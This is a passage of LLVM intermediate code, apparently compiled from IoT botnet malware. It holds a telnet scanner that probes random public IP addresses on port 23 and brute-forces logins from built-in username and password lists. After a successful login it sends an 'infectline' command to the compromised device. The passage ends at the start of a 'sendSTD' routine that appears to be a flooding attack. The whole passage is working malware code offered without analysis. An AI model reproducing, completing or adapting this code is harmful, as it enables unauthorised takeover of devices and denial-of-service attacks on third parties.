  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.timeval, align 8
  %7 = tail call i32 @getdtablesize() #3
  %8 = sdiv i32 %7, 4
  %9 = mul nsw i32 %8, 3
  %10 = icmp slt i32 %9, 512
  %11 = select i1 %10, i32 %9, i32 512
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = tail call zeroext i16 @htons(i16 zeroext 23) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %16 = bitcast i8* %15 to i64*
  store i64 0, i64* %16, align 4
  %17 = zext i32 %11 to i64
  %18 = alloca %struct.telstate_t, i64 %17, align 16
  %19 = bitcast %struct.telstate_t* %18 to i8*
  %20 = sext i32 %11 to i64
  %21 = mul nsw i64 %20, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %19, i8 0, i64 %21, i32 16, i1 false)
  %22 = icmp sgt i32 %7, 3
  br i1 %22, label %.lr.ph168.preheader, label %._crit_edge

.lr.ph168.preheader:                              ; preds = %0
  %23 = sext i32 %11 to i64
  br label %.lr.ph168

.lr.ph168:                                        ; preds = %.lr.ph168.preheader, %.lr.ph168
  %indvars.iv = phi i64 [ 0, %.lr.ph168.preheader ], [ %indvars.iv.next, %.lr.ph168 ]
  %24 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 3
  store i8 1, i8* %24, align 1
  %25 = tail call noalias i8* @malloc(i64 1024) #3
  %26 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 8
  store i8* %25, i8** %26, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %27 = icmp slt i64 %indvars.iv.next, %23
  br i1 %27, label %.lr.ph168, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph168
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %28 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 5, i64* %28, align 8
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 0, i64* %29, align 8
  %30 = icmp sgt i32 %7, 3
  %31 = bitcast %struct.timeval* %6 to i8*
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %._crit_edge
  br i1 %30, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %35 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %36 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 0
  %37 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %369
  %.1166 = phi i32 [ %.mux, %369 ], [ 0, %.lr.ph.preheader ]
  %38 = sext i32 %.1166 to i64
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38
  %40 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 2
  %41 = load i8, i8* %40, align 8
  switch i8 %41, label %369 [
    i8 0, label %42
    i8 1, label %94
    i8 2, label %143
    i8 3, label %196
    i8 4, label %219
    i8 5, label %263
    i8 6, label %286
    i8 7, label %331
    i8 8, label %341
  ]

; <label>:42:                                     ; preds = %.lr.ph
  %43 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %44 = load i8*, i8** %43, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  %46 = load i8, i8* %45, align 1
  %47 = icmp eq i8 %46, 0
  br i1 %47, label %54, label %48

; <label>:48:                                     ; preds = %42
  %49 = bitcast i8** %43 to i64*
  %50 = load i64, i64* %49, align 8
  %51 = bitcast %struct.telstate_t* %39 to i8*
  call void @llvm.memset.p0i8.i64(i8* %51, i8 0, i64 32, i32 16, i1 false)
  store i64 %50, i64* %49, align 8
  %52 = call i32 @getRandomPublicIP()
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  store i32 %52, i32* %53, align 4
  br label %68

; <label>:54:                                     ; preds = %42
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %56 = load i8, i8* %55, align 1
  %57 = add i8 %56, 1
  store i8 %57, i8* %55, align 1
  %58 = icmp eq i8 %57, 14
  br i1 %58, label %59, label %63

; <label>:59:                                     ; preds = %54
  store i8 0, i8* %55, align 1
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %61 = load i8, i8* %60, align 2
  %62 = add i8 %61, 1
  store i8 %62, i8* %60, align 2
  br label %63

; <label>:63:                                     ; preds = %59, %54
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %65 = load i8, i8* %64, align 2
  %66 = icmp eq i8 %65, 6
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %63
  store i8 1, i8* %45, align 1
  br label %369

; <label>:68:                                     ; preds = %63, %48
  store i16 2, i16* %12, align 4
  store i16 %13, i16* %14, align 2
  store i64 0, i64* %16, align 4
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  %70 = load i32, i32* %69, align 4
  store i32 %70, i32* %34, align 4
  %71 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  store i32 %71, i32* %72, align 16
  %73 = call i32 @setsockopt(i32 %71, i32 1, i32 20, i8* nonnull %31, i32 16) #3
  %74 = load i32, i32* %72, align 16
  %75 = call i32 @setsockopt(i32 %74, i32 1, i32 21, i8* nonnull %31, i32 16) #3
  %76 = load i32, i32* %72, align 16
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %369, label %78

; <label>:78:                                     ; preds = %68
  %79 = call i32 (i32, i32, ...) @fcntl(i32 %76, i32 3, i8* null) #3
  %80 = or i32 %79, 2048
  %81 = call i32 (i32, i32, ...) @fcntl(i32 %76, i32 4, i32 %80) #3
  %82 = load i32, i32* %72, align 16
  %83 = call i32 @connect(i32 %82, %struct.sockaddr* nonnull %35, i32 16) #3
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %85, label %92

; <label>:85:                                     ; preds = %78
  %86 = tail call i32* @__errno_location() #18
  %87 = load i32, i32* %86, align 4
  %88 = icmp eq i32 %87, 115
  br i1 %88, label %92, label %89

; <label>:89:                                     ; preds = %85
  %90 = load i32, i32* %72, align 16
  %91 = call i32 @sclose(i32 %90)
  store i8 1, i8* %45, align 1
  br label %369

; <label>:92:                                     ; preds = %85, %78
  store i8 1, i8* %40, align 8
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  store i32 0, i32* %93, align 4
  br label %369

; <label>:94:                                     ; preds = %.lr.ph
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %96 = load i32, i32* %95, align 4
  %97 = icmp eq i32 %96, 0
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %94
  %99 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %99, i32* %95, align 4
  br label %100

; <label>:100:                                    ; preds = %94, %98
  %101 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %32) #3, !srcloc !6
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %103 = load i32, i32* %102, align 16
  %104 = srem i32 %103, 64
  %105 = zext i32 %104 to i64
  %106 = shl i64 1, %105
  %107 = sdiv i32 %103, 64
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %108
  %110 = load i64, i64* %109, align 8
  %111 = or i64 %106, %110
  store i64 %111, i64* %109, align 8
  store i64 0, i64* %36, align 8
  store i64 10000, i64* %33, align 8
  %112 = load i32, i32* %102, align 16
  %113 = add nsw i32 %112, 1
  %114 = call i32 @select(i32 %113, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %2) #3
  switch i32 %114, label %134 [
    i32 1, label %115
    i32 -1, label %130
  ]

; <label>:115:                                    ; preds = %100
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %116 = load i32, i32* %102, align 16
  %117 = call i32 @getsockopt(i32 %116, i32 1, i32 4, i8* nonnull %37, i32* nonnull %3) #3
  %118 = load i32, i32* %4, align 4
  %119 = icmp eq i32 %118, 0
  %120 = load i32, i32* %102, align 16
  br i1 %119, label %123, label %121

; <label>:121:                                    ; preds = %115
  %122 = call i32 @sclose(i32 %120)
  br label %.sink.split

; <label>:123:                                    ; preds = %115
  %124 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 3, i8* null) #3
  %125 = and i32 %124, -2049
  %126 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 4, i32 %125) #3
  store i32 0, i32* %95, align 4
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  store i16 0, i16* %127, align 16
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %129 = load i8*, i8** %128, align 8
  call void @llvm.memset.p0i8.i64(i8* %129, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %40, align 8
  br label %369

; <label>:130:                                    ; preds = %100
  %131 = load i32, i32* %102, align 16
  %132 = call i32 @sclose(i32 %131)
  br label %.sink.split

.sink.split:                                      ; preds = %121, %130
  store i8 0, i8* %40, align 8
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %133, align 1
  br label %134

; <label>:134:                                    ; preds = %100, %.sink.split
  %135 = load i32, i32* %95, align 4
  %136 = add i32 %135, 5
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %138 = icmp ult i32 %136, %137
  br i1 %138, label %139, label %369

; <label>:139:                                    ; preds = %134
  %140 = load i32, i32* %102, align 16
  %141 = call i32 @sclose(i32 %140)
  store i8 0, i8* %40, align 8
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %142, align 1
  br label %369

; <label>:143:                                    ; preds = %.lr.ph
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %145 = load i32, i32* %144, align 4
  %146 = icmp eq i32 %145, 0
  br i1 %146, label %147, label %149

; <label>:147:                                    ; preds = %143
  %148 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %148, i32* %144, align 4
  br label %149

; <label>:149:                                    ; preds = %147, %143
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %151 = load i8*, i8** %150, align 8
  %152 = call i32 @matchPrompt(i8* %151)
  %153 = icmp eq i32 %152, 0
  br i1 %153, label %155, label %154

; <label>:154:                                    ; preds = %149
  store i8 7, i8* %40, align 8
  br label %155

; <label>:155:                                    ; preds = %149, %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %157 = load i32, i32* %156, align 16
  %158 = load i8*, i8** %150, align 8
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  %160 = load i16, i16* %159, align 16
  %161 = zext i16 %160 to i32
  %162 = call i32 @readUntil(i32 %157, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %158, i32 1024, i32 %161)
  %163 = icmp eq i32 %162, 0
  br i1 %163, label %166, label %164

; <label>:164:                                    ; preds = %155
  store i32 0, i32* %144, align 4
  store i16 0, i16* %159, align 16
  %165 = load i8*, i8** %150, align 8
  call void @llvm.memset.p0i8.i64(i8* %165, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %40, align 8
  br label %369

; <label>:166:                                    ; preds = %155
  %167 = load i32, i32* %156, align 16
  %168 = load i8*, i8** %150, align 8
  %169 = load i16, i16* %159, align 16
  %170 = zext i16 %169 to i32
  %171 = call i32 @readUntil(i32 %167, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %168, i32 1024, i32 %170)
  %172 = icmp eq i32 %171, 0
  br i1 %172, label %175, label %173

; <label>:173:                                    ; preds = %166
  store i32 0, i32* %144, align 4
  store i16 0, i16* %159, align 16
  %174 = load i8*, i8** %150, align 8
  call void @llvm.memset.p0i8.i64(i8* %174, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %40, align 8
  br label %369

; <label>:175:                                    ; preds = %166
  %176 = load i32, i32* %156, align 16
  %177 = load i8*, i8** %150, align 8
  %178 = load i16, i16* %159, align 16
  %179 = zext i16 %178 to i32
  %180 = call i32 @readUntil(i32 %176, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %177, i32 1024, i32 %179)
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %184, label %182

; <label>:182:                                    ; preds = %175
  store i32 0, i32* %144, align 4
  store i16 0, i16* %159, align 16
  %183 = load i8*, i8** %150, align 8
  call void @llvm.memset.p0i8.i64(i8* %183, i8 0, i64 1024, i32 1, i1 false)
  store i8 5, i8* %40, align 8
  br label %369

; <label>:184:                                    ; preds = %175
  %185 = load i8*, i8** %150, align 8
  %186 = call i64 @strlen(i8* %185) #15
  %187 = trunc i64 %186 to i16
  store i16 %187, i16* %159, align 16
  %188 = load i32, i32* %144, align 4
  %189 = add i32 %188, 20
  %190 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %191 = icmp ult i32 %189, %190
  br i1 %191, label %192, label %369

; <label>:192:                                    ; preds = %184
  %193 = load i32, i32* %156, align 16
  %194 = call i32 @sclose(i32 %193)
  store i8 0, i8* %40, align 8
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %195, align 1
  br label %369

; <label>:196:                                    ; preds = %.lr.ph
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %198 = load i32, i32* %197, align 16
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %200 = load i8, i8* %199, align 2
  %201 = zext i8 %200 to i64
  %202 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %201
  %203 = load i8*, i8** %202, align 8
  %204 = call i64 @strlen(i8* %203) #15
  %205 = call i64 @send(i32 %198, i8* %203, i64 %204, i32 16384) #3
  %206 = icmp slt i64 %205, 0
  %207 = load i32, i32* %197, align 16
  br i1 %206, label %208, label %211

; <label>:208:                                    ; preds = %196
  %209 = call i32 @sclose(i32 %207)
  store i8 0, i8* %40, align 8
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %210, align 1
  br label %369

; <label>:211:                                    ; preds = %196
  %212 = call i64 @send(i32 %207, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i64 0, i64 0), i64 2, i32 16384) #3
  %213 = icmp slt i64 %212, 0
  br i1 %213, label %214, label %218

; <label>:214:                                    ; preds = %211
  %215 = load i32, i32* %197, align 16
  %216 = call i32 @sclose(i32 %215)
  store i8 0, i8* %40, align 8
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %217, align 1
  br label %369

; <label>:218:                                    ; preds = %211
  store i8 4, i8* %40, align 8
  br label %369

; <label>:219:                                    ; preds = %.lr.ph
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %221 = load i32, i32* %220, align 4
  %222 = icmp eq i32 %221, 0
  br i1 %222, label %223, label %225

; <label>:223:                                    ; preds = %219
  %224 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %224, i32* %220, align 4
  br label %225

; <label>:225:                                    ; preds = %223, %219
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %227 = load i8*, i8** %226, align 8
  %228 = call i32 @matchPrompt(i8* %227)
  %229 = icmp eq i32 %228, 0
  br i1 %229, label %231, label %230

; <label>:230:                                    ; preds = %225
  store i8 7, i8* %40, align 8
  br label %231

; <label>:231:                                    ; preds = %225, %230
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %233 = load i32, i32* %232, align 16
  %234 = load i8*, i8** %226, align 8
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  %236 = load i16, i16* %235, align 16
  %237 = zext i16 %236 to i32
  %238 = call i32 @readUntil(i32 %233, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %234, i32 1024, i32 %237)
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %244, label %240

; <label>:240:                                    ; preds = %231
  store i32 0, i32* %220, align 4
  store i16 0, i16* %235, align 16
  %241 = load i8*, i8** %226, align 8
  %242 = call i8* @strstr(i8* %241, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i64 0, i64 0)) #15
  %243 = icmp ne i8* %242, null
  %.sink = select i1 %243, i8 5, i8 7
  store i8 %.sink, i8* %40, align 8
  call void @llvm.memset.p0i8.i64(i8* %241, i8 0, i64 1024, i32 1, i1 false)
  br label %369

; <label>:244:                                    ; preds = %231
  %245 = load i8*, i8** %226, align 8
  %246 = call i8* @strstr(i8* %245, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i64 0, i64 0)) #15
  %247 = icmp eq i8* %246, null
  br i1 %247, label %252, label %248

; <label>:248:                                    ; preds = %244
  %249 = load i32, i32* %232, align 16
  %250 = call i32 @sclose(i32 %249)
  store i8 0, i8* %40, align 8
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %251, align 1
  br label %369

; <label>:252:                                    ; preds = %244
  %253 = call i64 @strlen(i8* %245) #15
  %254 = trunc i64 %253 to i16
  store i16 %254, i16* %235, align 16
  %255 = load i32, i32* %220, align 4
  %256 = add i32 %255, 8
  %257 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %258 = icmp ult i32 %256, %257
  br i1 %258, label %259, label %369

; <label>:259:                                    ; preds = %252
  %260 = load i32, i32* %232, align 16
  %261 = call i32 @sclose(i32 %260)
  store i8 0, i8* %40, align 8
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %262, align 1
  br label %369

; <label>:263:                                    ; preds = %.lr.ph
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %265 = load i32, i32* %264, align 16
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %267 = load i8, i8* %266, align 1
  %268 = zext i8 %267 to i64
  %269 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %268
  %270 = load i8*, i8** %269, align 8
  %271 = call i64 @strlen(i8* %270) #15
  %272 = call i64 @send(i32 %265, i8* %270, i64 %271, i32 16384) #3
  %273 = icmp slt i64 %272, 0
  %274 = load i32, i32* %264, align 16
  br i1 %273, label %275, label %278

; <label>:275:                                    ; preds = %263
  %276 = call i32 @sclose(i32 %274)
  store i8 0, i8* %40, align 8
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %277, align 1
  br label %369

; <label>:278:                                    ; preds = %263
  %279 = call i64 @send(i32 %274, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i64 0, i64 0), i64 2, i32 16384) #3
  %280 = icmp slt i64 %279, 0
  br i1 %280, label %281, label %285

; <label>:281:                                    ; preds = %278
  %282 = load i32, i32* %264, align 16
  %283 = call i32 @sclose(i32 %282)
  store i8 0, i8* %40, align 8
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %284, align 1
  br label %369

; <label>:285:                                    ; preds = %278
  store i8 6, i8* %40, align 8
  br label %369

; <label>:286:                                    ; preds = %.lr.ph
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %288 = load i32, i32* %287, align 4
  %289 = icmp eq i32 %288, 0
  br i1 %289, label %290, label %292

; <label>:290:                                    ; preds = %286
  %291 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %291, i32* %287, align 4
  br label %292

; <label>:292:                                    ; preds = %290, %286
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %294 = load i32, i32* %293, align 16
  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %296 = load i8*, i8** %295, align 8
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  %298 = load i16, i16* %297, align 16
  %299 = zext i16 %298 to i32
  %300 = call i32 @readUntil(i32 %294, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %296, i32 1024, i32 %299)
  %301 = icmp eq i32 %300, 0
  br i1 %301, label %319, label %302

; <label>:302:                                    ; preds = %292
  store i32 0, i32* %287, align 4
  store i16 0, i16* %297, align 16
  %303 = load i8*, i8** %295, align 8
  %304 = call i8* @strstr(i8* %303, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i64 0, i64 0)) #15
  %305 = icmp eq i8* %304, null
  br i1 %305, label %310, label %306

; <label>:306:                                    ; preds = %302
  call void @llvm.memset.p0i8.i64(i8* %303, i8 0, i64 1024, i32 1, i1 false)
  %307 = load i32, i32* %293, align 16
  %308 = call i32 @sclose(i32 %307)
  store i8 0, i8* %40, align 8
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 0, i8* %309, align 1
  br label %369

; <label>:310:                                    ; preds = %302
  %311 = call i32 @matchPrompt(i8* %303)
  %312 = icmp eq i32 %311, 0
  br i1 %312, label %313, label %317

; <label>:313:                                    ; preds = %310
  call void @llvm.memset.p0i8.i64(i8* %303, i8 0, i64 1024, i32 1, i1 false)
  %314 = load i32, i32* %293, align 16
  %315 = call i32 @sclose(i32 %314)
  store i8 0, i8* %40, align 8
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %316, align 1
  br label %369

; <label>:317:                                    ; preds = %310
  store i8 7, i8* %40, align 8
  %318 = load i8*, i8** %295, align 8
  call void @llvm.memset.p0i8.i64(i8* %318, i8 0, i64 1024, i32 1, i1 false)
  br label %369

; <label>:319:                                    ; preds = %292
  %320 = load i8*, i8** %295, align 8
  %321 = call i64 @strlen(i8* %320) #15
  %322 = trunc i64 %321 to i16
  store i16 %322, i16* %297, align 16
  %323 = load i32, i32* %287, align 4
  %324 = add i32 %323, 20
  %325 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %326 = icmp ult i32 %324, %325
  br i1 %326, label %327, label %369

; <label>:327:                                    ; preds = %319
  %328 = load i32, i32* %293, align 16
  %329 = call i32 @sclose(i32 %328)
  store i8 0, i8* %40, align 8
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %330, align 1
  br label %369

; <label>:331:                                    ; preds = %.lr.ph
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %333 = load i32, i32* %332, align 16
  %334 = call i64 @send(i32 %333, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i64 0, i64 0), i64 4, i32 16384) #3
  %335 = icmp slt i64 %334, 0
  br i1 %335, label %336, label %340

; <label>:336:                                    ; preds = %331
  %337 = load i32, i32* %332, align 16
  %338 = call i32 @sclose(i32 %337)
  store i8 0, i8* %40, align 8
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %339, align 1
  br label %369

; <label>:340:                                    ; preds = %331
  store i8 8, i8* %40, align 8
  br label %369

; <label>:341:                                    ; preds = %.lr.ph
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %343 = load i32, i32* %342, align 4
  %344 = icmp eq i32 %343, 0
  br i1 %344, label %345, label %347

; <label>:345:                                    ; preds = %341
  %346 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %346, i32* %342, align 4
  br label %347

; <label>:347:                                    ; preds = %345, %341
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %349 = load i32, i32* %348, align 16
  %350 = load i8*, i8** @infectline, align 8
  %351 = call i64 @strlen(i8* %350) #15
  %352 = call i64 @send(i32 %349, i8* %350, i64 %351, i32 16384) #3
  %353 = icmp slt i64 %352, 0
  br i1 %353, label %354, label %360

; <label>:354:                                    ; preds = %347
  %355 = load i32, i32* %348, align 16
  %356 = call i32 @sclose(i32 %355)
  store i8 0, i8* %40, align 8
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %357, align 1
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %359 = load i8*, i8** %358, align 8
  call void @llvm.memset.p0i8.i64(i8* %359, i8 0, i64 1024, i32 1, i1 false)
  br label %369

; <label>:360:                                    ; preds = %347
  %361 = load i32, i32* %342, align 4
  %362 = add i32 %361, 15
  %363 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %364 = icmp ult i32 %362, %363
  br i1 %364, label %365, label %369

; <label>:365:                                    ; preds = %360
  %366 = load i32, i32* %348, align 16
  %367 = call i32 @sclose(i32 %366)
  store i8 0, i8* %40, align 8
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %368, align 1
  br label %369

; <label>:369:                                    ; preds = %.lr.ph, %218, %285, %340, %92, %89, %139, %134, %192, %184, %259, %252, %327, %319, %365, %360, %68, %354, %336, %317, %313, %306, %281, %275, %248, %240, %214, %208, %182, %173, %164, %123, %67
  %370 = add nsw i32 %.1166, 1
  %371 = icmp slt i32 %370, %11
  %brmerge = or i1 %371, %30
  %.mux = select i1 %371, i32 %370, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %369
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

declare i32 @time(...) local_unnamed_addr #4

; Function Attrs: noinline noreturn nounwind uwtable
define void @sendSTD(i8*, i32, i32) local_unnamed_addr #12 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %7 = sext i32 %6 to i64
  %8 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %9 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 16, i32 4, i1 false)
  %10 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 4
  %11 = load i8**, i8*** %10, align 8
  %12 = load i8*, i8** %11, align 8
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %14 = bitcast %struct.in_addr* %13 to i8*
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 3
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
